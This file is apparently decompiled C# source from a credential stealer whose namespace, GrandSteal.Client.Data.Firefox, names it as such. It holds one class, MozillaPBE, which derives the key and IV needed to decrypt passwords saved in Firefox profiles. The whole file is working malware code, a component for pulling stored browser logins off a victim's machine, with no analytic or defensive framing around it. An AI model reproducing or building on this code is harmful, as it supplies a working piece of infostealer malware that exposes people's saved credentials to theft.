using System;
using System.Security.Cryptography;

namespace GrandSteal.Client.Data.Firefox
{
	// Token: 0x02000017 RID: 23
	public class MozillaPBE
	{
		// Token: 0x17000035 RID: 53
		// (get) Token: 0x06000096 RID: 150 RVA: 0x00002509 File Offset: 0x00000709
		// (set) Token: 0x06000097 RID: 151 RVA: 0x00002511 File Offset: 0x00000711
		private byte[] GlobalSalt { get; set; }

		// Token: 0x17000036 RID: 54
		// (get) Token: 0x06000098 RID: 152 RVA: 0x0000251A File Offset: 0x0000071A
		// (set) Token: 0x06000099 RID: 153 RVA: 0x00002522 File Offset: 0x00000722
		private byte[] MasterPassword { get; set; }

		// Token: 0x17000037 RID: 55
		// (get) Token: 0x0600009A RID: 154 RVA: 0x0000252B File Offset: 0x0000072B
		// (set) Token: 0x0600009B RID: 155 RVA: 0x00002533 File Offset: 0x00000733
		private byte[] EntrySalt { get; set; }

		// Token: 0x17000038 RID: 56
		// (get) Token: 0x0600009C RID: 156 RVA: 0x0000253C File Offset: 0x0000073C
		// (set) Token: 0x0600009D RID: 157 RVA: 0x00002544 File Offset: 0x00000744
		public byte[] Key { get; private set; }

		// Token: 0x17000039 RID: 57
		// (get) Token: 0x0600009E RID: 158 RVA: 0x0000254D File Offset: 0x0000074D
		// (set) Token: 0x0600009F RID: 159 RVA: 0x00002555 File Offset: 0x00000755
		public byte[] IV { get; private set; }

		// Token: 0x060000A0 RID: 160 RVA: 0x0000255E File Offset: 0x0000075E
		public MozillaPBE(byte[] GlobalSalt, byte[] MasterPassword, byte[] EntrySalt)
		{
			this.GlobalSalt = GlobalSalt;
			this.MasterPassword = MasterPassword;
			this.EntrySalt = EntrySalt;
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x00004DE8 File Offset: 0x00002FE8
		public void Compute()
		{
			SHA1CryptoServiceProvider sha1CryptoServiceProvider = new SHA1CryptoServiceProvider();
			byte[] array = new byte[this.GlobalSalt.Length + this.MasterPassword.Length];
			Array.Copy(this.GlobalSalt, 0, array, 0, this.GlobalSalt.Length);
			Array.Copy(this.MasterPassword, 0, array, this.GlobalSalt.Length, this.MasterPassword.Length);
			byte[] array2 = sha1CryptoServiceProvider.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + this.EntrySalt.Length];
			Array.Copy(array2, 0, array3, 0, array2.Length);
			Array.Copy(this.EntrySalt, 0, array3, array2.Length, this.EntrySalt.Length);
			byte[] key = sha1CryptoServiceProvider.ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(this.EntrySalt, 0, array4, 0, this.EntrySalt.Length);
			for (int i = this.EntrySalt.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + this.EntrySalt.Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(this.EntrySalt, 0, array5, array4.Length, this.EntrySalt.Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hmacsha = new HMACSHA1(key))
			{
				array6 = hmacsha.ComputeHash(array5);
				byte[] array7 = hmacsha.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + this.EntrySalt.Length];
				Array.Copy(array7, 0, array8, 0, array7.Length);
				Array.Copy(this.EntrySalt, 0, array8, array7.Length, this.EntrySalt.Length);
				array9 = hmacsha.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			this.Key = new byte[24];
			for (int j = 0; j < this.Key.Length; j++)
			{
				this.Key[j] = array10[j];
			}
			this.IV = new byte[8];
			int num = this.IV.Length - 1;
			for (int k = array10.Length - 1; k >= array10.Length - this.IV.Length; k--)
			{
				this.IV[num] = array10[k];
				num--;
			}
		}
	}
}
